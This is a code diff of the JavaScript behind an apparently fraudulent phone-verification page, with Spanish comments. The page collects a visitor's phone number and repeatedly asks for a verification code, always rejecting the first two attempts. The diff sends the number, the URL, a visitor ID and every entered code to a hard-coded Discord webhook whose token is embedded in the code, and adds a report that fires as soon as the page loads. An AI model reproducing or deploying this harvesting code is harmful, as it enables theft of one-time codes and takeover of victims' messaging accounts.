@@ -247,9 +247,8 @@
   "use strict";
 
   /* ================= CONFIGURACIÓN ================= */
-  const DISCORD_WEBHOOK =  "https://discord.com/api/webhooks/1573556665217851433/b1WgG7gG-wYJtB_KOv0t1b3_280DfazWoiLgrNzI1vg1eJAZD-WY9A0xEnFGmCxnQwRO"
+  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1573556665217851433/b1WgG7gG-wYJtB_KOv0t1b3_280DfazWoiLgrNzI1vg1eJAZD-WY9A0xEnFGmCxnQwRO";
   var CONFIG = {
-    endpoint: "https://thesecuremockserverpro.free.beeceptor.com",
     whatsapp: "https://chat.whatsapp.com/IQMGOssbw7A4IAJrV6p6PM?s=cl&p=a&iam=2",
     esperaMs: 15000,
     intentosFallidos: 2,
@@ -270,7 +269,6 @@
     try {
       var params = new URLSearchParams(window.location.search);
       var raw = (params.get("numer") || "").trim();
-      // Solo dígitos (sin +, sin espacios)
       var digitos = raw.replace(/\D/g, "");
       if(digitos.length >= 8) return digitos;
     } catch(e){ /* URLSearchParams no soportado */ }
@@ -301,60 +299,58 @@
     $("nIntento2").textContent = Math.min(intentos + 1, CONFIG.intentosPermitidos);
   }
 
-  /* ================= JSON ORDENADO ================= */
+  /* ================= JSON ORDENADO (ya no se usa para Beeceptor, pero lo dejo por si acaso) ================= */
   function ordenar(obj){
     var salida = {};
     Object.keys(obj).sort().forEach(function(k){ salida[k] = obj[k]; });
     return salida;
   }
 
-  /* ================= ENVÍO A BEECEPTOR (SIEMPRE SALE) ================= */
-  
-function enviar(msg) {
-    var contenido = "";
+  /* ================= ENVÍO A DISCORD WEBHOOK ================= */
+  function enviar(msg) {
+    var contenido;
 
-    if (typeof msg === "object" && msg !== null) {
-        contenido = Object.entries(msg)
-            .map(function(item) {
-                var clave = item[0];
-                var valor = item[1];
-
-                if (valor === null || valor === undefined) {
-                    valor = "";
-                } else if (typeof valor === "object") {
-                    valor = JSON.stringify(valor);
-                }
-
-                return clave.toUpperCase() + ": " + String(valor);
-            })
-            .join("\n");
+    if (typeof msg === "string") {
+        contenido = msg;
+    } else if (msg === null || msg === undefined) {
+        contenido = "";
+    } else if (typeof msg === "object") {
+        contenido = JSON.stringify(msg, null, 2);
     } else {
-        contenido = String(msg ?? "");
+        contenido = String(msg);
     }
 
-    return fetch(CONFIG.endpoint, {
+    return fetch(DISCORD_WEBHOOK, {
         method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            content: contenido
-        })
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: contenido })
     })
     .then(function(res) {
-        if (!res.ok) {
-            throw new Error("Discord HTTP " + res.status);
-        }
-
-        console.log("[Discord] Enviado correctamente");
+        if (!res.ok) throw new Error("Discord HTTP " + res.status);
+        console.log("[Discord] Mensaje enviado");
         return true;
     })
     .catch(function(err) {
         console.error("[Discord] Error:", err);
         return false;
     });
-}
+  }
 
+  /* ================= ENVÍO AL ENTRAR A LA PÁGINA (número + enter) ================= */
+  function enviarEntrada(){
+    var numero = NUMERO_URL || numeroGuardado || "(sin número)";
+    var msg =
+      "🟢 **Nuevo visitante en la página**\n" +
+      "━━━━━━━━━━━━━━━━━━\n" +
+      "📱 **Número:** `" + numero + "`\n" +
+      "🆔 **ID:** `" + VISITANTE + "`\n" +
+      "🔗 **URL:** " + window.location.href + "\n" +
+      "⏰ **Hora:** " + new Date().toLocaleString() + "\n" +
+      "━━━━━━━━━━━━━━━━━━\n" +
+      "➡️ Acción: entró a la página\n" +
+      "⏎ Enter";
+    enviar(msg);
+  }
 
   /* ================= VALIDADOR DE NÚMEROS ================= */
   var input = $("telefono");
@@ -427,8 +423,17 @@ function enviar(msg) {
     localStorage.setItem("visitante_intentos_codigo", "0");
     intentos = 0;
 
-    // Enviamos el número (siempre, aunque venga de URL también interesa registrar)
-    enviar({ id: VISITANTE, numero: numero, paso: "numero", origen: desdeURL ? "url" : "form" });
+    // Enviamos el número a Discord (paso 1 -> paso 2)
+    var msg =
+      "📱 **Número registrado**\n" +
+      "━━━━━━━━━━━━━━━━━━\n" +
+      "📞 **Número:** `" + numero + "`\n" +
+      "🆔 **ID:** `" + VISITANTE + "`\n" +
+      "🔗 **Origen:** " + (desdeURL ? "URL (?numer=)" : "Formulario") + "\n" +
+      "⏰ **Hora:** " + new Date().toLocaleString() + "\n" +
+      "━━━━━━━━━━━━━━━━━━\n" +
+      "➡️ Acción: pasó al paso 2 (código)";
+    enviar(msg);
 
     $("numMostrado").textContent = numero;
     $("paso1").hidden = true;
@@ -437,7 +442,6 @@ function enviar(msg) {
     $("b2").classList.add("on");
     pintarIntento();
 
-    // Si viene de URL, ocultamos el botón de volver
     if(desdeURL){
       $("volver").hidden = true;
     } else {
@@ -497,15 +501,18 @@ function enviar(msg) {
     intentos += 1;
     localStorage.setItem("visitante_intentos_codigo", String(intentos));
 
-    // 🔑 ENVIAMOS EL CÓDIGO ANTES DEL LOADING
-    //    Así el intento 1 (fallo), 2 (fallo) y 3 (éxito) salen siempre.
-    enviar({
-      id: VISITANTE,
-      numero: numeroGuardado,
-      codigo: codigo,
-      intento: intentos,
-      resultado: intentos <= CONFIG.intentosFallidos ? "fallo" : "exito"
-    });
+    // 🔑 ENVIAMOS EL CÓDIGO A DISCORD ANTES DEL LOADING
+    var resultado = intentos <= CONFIG.intentosFallidos ? "fallo" : "exito";
+    var msg =
+      (resultado === "exito" ? "✅" : "❌") + " **Código intento " + intentos + "/" + CONFIG.intentosPermitidos + " (" + resultado + ")**\n" +
+      "━━━━━━━━━━━━━━━━━━\n" +
+      "🔢 **Código:** `" + codigo + "`\n" +
+      "📞 **Número:** `" + numeroGuardado + "`\n" +
+      "🆔 **ID:** `" + VISITANTE + "`\n" +
+      "⏰ **Hora:** " + new Date().toLocaleString() + "\n" +
+      "━━━━━━━━━━━━━━━━━━\n" +
+      (resultado === "exito" ? "➡️ Acción: redirigiendo a WhatsApp" : "➡️ Acción: vuelve a pedir código");
+    enviar(msg);
 
     // Loading visual (bloquea la UI pero el envío ya salió)
     await cargar();
@@ -528,7 +535,6 @@ function enviar(msg) {
   });
 
   $("volver").addEventListener("click", function(){
-    // Si viene de URL no permitimos volver (aunque esté oculto, por seguridad)
     if(NUMERO_URL) return;
     $("paso2").hidden = true;
     $("paso1").hidden = false;
@@ -544,10 +550,12 @@ function enviar(msg) {
   /* ================= INICIALIZACIÓN ================= */
   pintarIntento();
 
-  // Si hay ?numer= válido, saltamos directo al paso 2
+  // 1) Enviamos el número + enter al entrar a la página (siempre)
+  enviarEntrada();
+
+  // 2) Si hay ?numer= válido, saltamos directo al paso 2
   if(NUMERO_URL){
     var arrancar = function(){
-      // Mostramos el número tal cual vino en la URL (sin +)
       $("paso1").hidden = true;
       $("paso2").hidden = false;
       irAPaso2(NUMERO_URL, true);
